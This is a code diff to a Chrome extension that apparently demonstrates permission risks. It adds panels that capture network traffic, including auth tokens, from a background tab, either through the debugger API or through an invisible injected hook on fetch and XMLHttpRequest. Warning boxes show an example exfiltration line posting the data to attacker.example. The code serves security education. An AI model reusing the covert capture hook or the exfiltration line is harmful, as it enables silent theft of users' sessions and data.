@@ -74,6 +74,17 @@ async function activeTabInfo() {
   return tab;
 }
 
+// For panels that need a *website* tab (debugger can't attach to this extension page).
+// activeTabInfo() would just return this dashboard tab, since clicking its button
+// necessarily makes it the active tab — so instead find the most recently used
+// http(s) tab anywhere in the browser, which can sit in the background.
+async function mostRecentWebTab() {
+  const tabs = await chrome.tabs.query({});
+  const webTabs = tabs.filter((t) => /^https?:/.test(t.url || ""));
+  webTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
+  return webTabs[0] || null;
+}
+
 function getNS(path) {
   return path.split(".").reduce((o, k) => (o && o[k] !== undefined ? o[k] : undefined), chrome);
 }
@@ -113,12 +124,12 @@ item("Critical", "cookies", "cookies",
 item("Critical", "debugger", "debugger",
   `Attaches Chrome DevTools Protocol to a real tab: full-page screenshot, arbitrary JS evaluation in page
    context, live localStorage keys — all bypassing content-script isolation and page CSP. Shows a visible
-   "is debugging this browser" bar while attached (that visibility is the one safeguard). Switch to a normal
-   website tab first, then click.`,
+   "is debugging this browser" bar while attached (that visibility is the one safeguard). Attaches to
+   whichever http(s) tab you used most recently — it can be in the background, just click.`,
   async () => {
-    const tab = await activeTabInfo();
-    if (!tab?.id || !/^https?:/.test(tab.url || "")) {
-      return out("debugger", '<div class="err">Switch to a normal http(s) tab and make it active, then click again — the debugger can\'t attach to this extension page.</div>');
+    const tab = await mostRecentWebTab();
+    if (!tab?.id) {
+      return out("debugger", '<div class="err">Open a normal http(s) tab somewhere (it can stay in the background) — the debugger can\'t attach to this extension page.</div>');
     }
     out("debugger", '<div class="muted">Attaching debugger…</div>');
     const target = { tabId: tab.id };
@@ -135,6 +146,21 @@ item("Critical", "debugger", "debugger",
       await chrome.debugger.detach(target);
     }
   }
+);
+
+item("Critical", "debuggerNetwork", "debugger: Network capture",
+  `Goes past what the DevTools Network tab shows you by default: attaches CDP to the active tab, enables the
+   <code>Network</code> domain, and pulls full request <em>and response bodies</em> — JSON payloads, auth
+   tokens, session data — for everything the tab loads during a fixed capture window. Same "debugger"
+   permission as above, just pointed at traffic instead of the page. Attaches to whichever http(s) tab you
+   used most recently — switch to it and browse for a few seconds right after clicking. Everything captured
+   stays in this page's memory and never leaves your machine — but nothing about the <code>debugger</code>
+   permission stops an extension from shipping it to a remote server with one more line of code. See the
+   note below the results.`,
+  null,
+  `<div class="row">
+     <button class="load" data-load="debuggerNetworkStart">Capture network traffic (10s)</button>
+   </div>`
 );
 
 item("Critical", "webRequest", "webRequest (live)",
@@ -799,6 +825,20 @@ item("Standard", "scripting", "scripting",
   }
 );
 
+item("Standard", "scriptingCapture", "scripting: Invisible network capture",
+  `The stealthy alternative to the <code>debugger</code> panels above: instead of attaching CDP (which forces
+   Chrome's unhidable "is debugging this browser" banner), this injects a script directly into the page that
+   monkey-patches <code>fetch</code> and <code>XMLHttpRequest</code>. It sees the same request/response bodies
+   the debugger network panel does — using only the <code>scripting</code> permission, tagged Standard here,
+   not Critical — and shows <em>zero</em> on-screen indicator that it's happening. Attaches to whichever
+   http(s) tab you used most recently — switch to it and trigger a few fetch/XHR calls (clicking around a
+   normal site works) right after clicking.`,
+  null,
+  `<div class="row">
+     <button class="load" data-load="scriptingCaptureStart">Capture via page injection (10s)</button>
+   </div>`
+);
+
 item("Standard", "search", "search",
   `Can trigger a search with your default search engine directly — this opens a new tab.`,
   null,
@@ -1000,6 +1040,154 @@ function renderCookies() {
   });
 }
 
+// ---- network capture rendering (debuggerNetwork panel) ----
+let lastNetworkRows = [];
+let decodeBase64Bodies = false;
+const NETWORK_BODY_PREVIEW_CHARS = 2000;
+
+function tryDecodeBase64(b64) {
+  try {
+    const binary = atob(b64);
+    const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
+    return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
+  } catch (e) {
+    return null;
+  }
+}
+
+function formatResponseBody(r) {
+  if (r.responseBodyRaw == null) return "";
+  if (!r.responseBodyIsBase64) return String(r.responseBodyRaw).slice(0, NETWORK_BODY_PREVIEW_CHARS);
+  if (!decodeBase64Bodies) {
+    return `(base64, ${r.responseBodyRaw.length} chars) ${r.responseBodyRaw.slice(0, 200)}…`;
+  }
+  const decoded = tryDecodeBase64(r.responseBodyRaw);
+  if (decoded == null) return `(base64, ${r.responseBodyRaw.length} chars — failed to decode, likely binary/non-UTF-8)`;
+  return decoded.slice(0, NETWORK_BODY_PREVIEW_CHARS);
+}
+
+function renderNetworkCapture() {
+  const rows = lastNetworkRows;
+  if (!rows.length) {
+    out("debuggerNetwork", '<div class="muted">No requests captured — nothing loaded in that tab during the window.</div>');
+    return;
+  }
+  const base64Count = rows.filter((r) => r.responseBodyIsBase64).length;
+  const payloadKb = (JSON.stringify(rows).length / 1024).toFixed(1);
+  const exfilWarning = `<div class="unavailable">
+      ⚠ <strong>${rows.length} requests / ~${payloadKb} KB</strong> of headers, cookies, auth tokens, and
+      response bodies is sitting in this page's memory right now, below. Getting it off your machine would
+      take one more line — no extra permission, no native app, nothing beyond what this panel already used:
+      <pre>fetch("https://attacker.example/collect", { method: "POST", body: JSON.stringify(capturedRequests) });</pre>
+      That's the entire exfiltration step. This demo stops at rendering it on screen — on purpose — but a
+      malicious extension with the <code>debugger</code> permission would not.
+    </div>`;
+  out("debuggerNetwork", exfilWarning +
+    `<div class="muted">${rows.length} requests captured, full headers + bodies
+      ${base64Count ? `&nbsp;<label class="reveal-toggle" style="display:inline"><input type="checkbox" id="network-decode-b64" ${decodeBase64Bodies ? "checked" : ""}> Decode base64 response bodies (${base64Count})</label>` : ""}
+    </div>` +
+    rows.map((r) => `
+      <div>
+        <div><strong>${esc(r.method)}</strong> ${esc(r.url)} — status ${esc(r.status ?? "pending")}</div>
+        <div class="muted">Request headers:</div>${pre(r.requestHeaders)}
+        ${r.requestBody ? `<div class="muted">Request body:</div><pre>${esc(String(r.requestBody).slice(0, NETWORK_BODY_PREVIEW_CHARS))}</pre>` : ""}
+        <div class="muted">Response headers:</div>${pre(r.responseHeaders || {})}
+        ${r.responseBodyRaw != null ? `<div class="muted">Response body (truncated):</div><pre>${esc(formatResponseBody(r))}</pre>` : ""}
+      </div>
+    `).join("<hr>"));
+  document.getElementById("network-decode-b64")?.addEventListener("change", (e) => {
+    decodeBase64Bodies = e.target.checked;
+    renderNetworkCapture();
+  });
+}
+
+// ---- scripting-capture rendering (scriptingCapture panel) ----
+let lastScriptingRows = [];
+
+// Injected via chrome.scripting.executeScript({world: "MAIN", func: mainWorldNetworkPatch}).
+// Must be fully self-contained — it runs standalone in the page's own JS context, with no
+// closure over anything in this file. Relays each fetch/XHR it sees via a DOM CustomEvent,
+// since MAIN world and the ISOLATED-world relay script below have separate globals and can
+// only pass data through the shared DOM.
+function mainWorldNetworkPatch() {
+  if (window.__dangerPatched) return;
+  window.__dangerPatched = true;
+
+  const origFetch = window.fetch;
+  window.fetch = async function (...args) {
+    const req = args[0];
+    const init = args[1] || {};
+    const url = typeof req === "string" ? req : req?.url;
+    const method = init.method || req?.method || "GET";
+    const reqBody = init.body ? String(init.body).slice(0, 4000) : null;
+    const res = await origFetch.apply(this, args);
+    try {
+      const text = await res.clone().text();
+      document.dispatchEvent(new CustomEvent("__danger_capture", {
+        detail: { kind: "fetch", method, url, status: res.status, requestBody: reqBody, responseBody: text.slice(0, 4000) }
+      }));
+    } catch (e) { /* opaque/binary response — nothing to relay */ }
+    return res;
+  };
+
+  const proto = XMLHttpRequest.prototype;
+  const origOpen = proto.open;
+  const origSend = proto.send;
+  proto.open = function (method, url, ...rest) {
+    this.__danger = { method, url };
+    return origOpen.call(this, method, url, ...rest);
+  };
+  proto.send = function (body) {
+    this.addEventListener("loadend", () => {
+      try {
+        document.dispatchEvent(new CustomEvent("__danger_capture", {
+          detail: {
+            kind: "xhr", method: this.__danger?.method, url: this.__danger?.url, status: this.status,
+            requestBody: body ? String(body).slice(0, 4000) : null,
+            responseBody: String(this.responseText || "").slice(0, 4000)
+          }
+        }));
+      } catch (e) { /* ignore */ }
+    });
+    return origSend.call(this, body);
+  };
+}
+
+// Injected via chrome.scripting.executeScript({func: mainWorldRelay}) in the default ISOLATED
+// world, which — unlike the MAIN world above — has access to chrome.runtime.
+function mainWorldRelay() {
+  if (window.__dangerRelayInstalled) return;
+  window.__dangerRelayInstalled = true;
+  document.addEventListener("__danger_capture", (e) => {
+    chrome.runtime.sendMessage({ __dangerCapture: true, entry: e.detail });
+  });
+}
+
+function renderScriptingCapture() {
+  const rows = lastScriptingRows;
+  if (!rows.length) {
+    out("scriptingCapture", '<div class="muted">No fetch/XHR calls captured — nothing was triggered in that tab during the window. (This only sees in-page fetch/XHR calls made after the patch installs, not the initial page load.)</div>');
+    return;
+  }
+  const payloadKb = (JSON.stringify(rows).length / 1024).toFixed(1);
+  const exfilWarning = `<div class="unavailable">
+      ⚠ <strong>${rows.length} requests / ~${payloadKb} KB</strong> captured with zero on-screen indicator —
+      no debugger banner, no runtime permission prompt, nothing beyond the one-time install screen. Getting
+      it off your machine is the same one-liner as the debugger panel:
+      <pre>fetch("https://attacker.example/collect", { method: "POST", body: JSON.stringify(capturedRequests) });</pre>
+      This demo stops at rendering it below — on purpose.
+    </div>`;
+  out("scriptingCapture", exfilWarning +
+    `<div class="muted">${rows.length} fetch/XHR calls captured from an injected page-context patch</div>` +
+    rows.map((r) => `
+      <div>
+        <div><strong>${esc(r.kind)} ${esc(r.method)}</strong> ${esc(r.url)} — status ${esc(r.status ?? "")}</div>
+        ${r.requestBody ? `<div class="muted">Request body:</div><pre>${esc(r.requestBody)}</pre>` : ""}
+        ${r.responseBody ? `<div class="muted">Response body:</div><pre>${esc(r.responseBody)}</pre>` : ""}
+      </div>
+    `).join("<hr>"));
+}
+
 const customLoaders = {
   async "cookies-domain"() {
     let domain = document.getElementById("cookie-domain").value.trim();
@@ -1053,6 +1241,95 @@ const customLoaders = {
     const text = document.getElementById("search-text").value.trim() || "test";
     await chrome.search.query({ text, disposition: "NEW_TAB" });
     out("search", `<div class="muted">Ran chrome.search.query({text: "${esc(text)}"}) — check the new tab it opened.</div>`);
+  },
+  async "debuggerNetworkStart"() {
+    const tab = await mostRecentWebTab();
+    if (!tab?.id) {
+      return out("debuggerNetwork", '<div class="err">Open a normal http(s) tab somewhere (it can stay in the background) — the debugger can\'t attach to this extension page.</div>');
+    }
+    const target = { tabId: tab.id };
+    const CAPTURE_MS = 10000;
+
+    const requests = new Map();
+    const order = [];
+
+    function onEvent(source, method, params) {
+      if (source.tabId !== tab.id) return;
+      if (method === "Network.requestWillBeSent") {
+        order.push(params.requestId);
+        requests.set(params.requestId, {
+          requestId: params.requestId,
+          url: params.request.url,
+          method: params.request.method,
+          requestHeaders: params.request.headers || {},
+          requestBody: params.request.postData || (params.request.hasPostData ? "(body present but too large to inline — CDP requires a separate Network.getRequestPostData call)" : ""),
+          status: null,
+          responseHeaders: null,
+          responseBodyRaw: null,
+          responseBodyIsBase64: false
+        });
+      } else if (method === "Network.responseReceived") {
+        const rec = requests.get(params.requestId);
+        if (rec) {
+          rec.status = params.response.status;
+          rec.responseHeaders = params.response.headers || {};
+        }
+      }
+    }
+
+    out("debuggerNetwork", '<div class="muted">Attaching debugger…</div>');
+    chrome.debugger.onEvent.addListener(onEvent);
+    await chrome.debugger.attach(target, "1.3");
+    try {
+      await chrome.debugger.sendCommand(target, "Network.enable", {});
+      out("debuggerNetwork", `<div class="muted">Capturing for ${CAPTURE_MS / 1000}s on "${esc(tab.title || tab.url)}" — switch to that tab and browse normally now…</div>`);
+      await new Promise((r) => setTimeout(r, CAPTURE_MS));
+
+      for (const id of order) {
+        const rec = requests.get(id);
+        if (rec.status == null) continue;
+        try {
+          const body = await chrome.debugger.sendCommand(target, "Network.getResponseBody", { requestId: id });
+          rec.responseBodyRaw = body.body;
+          rec.responseBodyIsBase64 = body.base64Encoded;
+        } catch (e) {
+          rec.responseBodyRaw = `(unavailable: ${e.message})`;
+        }
+      }
+    } finally {
+      chrome.debugger.onEvent.removeListener(onEvent);
+      await chrome.debugger.detach(target);
+    }
+
+    const rows = order.map((id) => requests.get(id)).filter((r) => r.status != null || r.requestBody);
+    lastNetworkRows = rows;
+    renderNetworkCapture();
+  },
+  async "scriptingCaptureStart"() {
+    const tab = await mostRecentWebTab();
+    if (!tab?.id) {
+      return out("scriptingCapture", '<div class="err">Open a normal http(s) tab somewhere (it can stay in the background) — need a page to inject the patch into.</div>');
+    }
+    const CAPTURE_MS = 10000;
+    const rows = [];
+
+    function onMsg(msg, sender) {
+      if (msg?.__dangerCapture && sender.tab?.id === tab.id) rows.push(msg.entry);
+    }
+    chrome.runtime.onMessage.addListener(onMsg);
+
+    out("scriptingCapture", '<div class="muted">Injecting page-context patch (no debugger banner)…</div>');
+    try {
+      await chrome.scripting.executeScript({ target: { tabId: tab.id }, world: "MAIN", func: mainWorldNetworkPatch, injectImmediately: true });
+      await chrome.scripting.executeScript({ target: { tabId: tab.id }, func: mainWorldRelay, injectImmediately: true });
+      out("scriptingCapture", `<div class="muted">Capturing for ${CAPTURE_MS / 1000}s on "${esc(tab.title || tab.url)}" — switch to it and click around / trigger fetch or XHR calls. No debugger banner will appear.</div>`);
+      await new Promise((r) => setTimeout(r, CAPTURE_MS));
+    } finally {
+      chrome.runtime.onMessage.removeListener(onMsg);
+    }
+
+    lastScriptingRows = rows;
+    renderScriptingCapture();
   }
 };
 
